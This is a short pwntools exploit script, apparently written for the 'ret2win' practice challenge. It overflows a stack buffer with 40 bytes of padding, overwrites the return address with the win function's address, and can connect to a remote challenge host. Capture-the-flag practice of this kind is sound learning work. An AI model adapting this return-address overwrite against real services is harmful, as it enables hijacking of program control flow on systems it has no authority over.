from pwn import *
from pwnlib.util.packing import p64

exe = ELF('/home/jerry/Downloads/ret2win/ret2win') # Adjust path if needed
context.binary = exe
context.terminal = ['tmux', 'splitw', '-h']

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote('154.57.164.78', 30110)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = ''''''

io = start()
#-----Exploit-----ls

win_addr = exe.symbols['ret2win']

payload = b'A' * 40 + p64(win_addr)

io.sendline(payload)
io.interactive()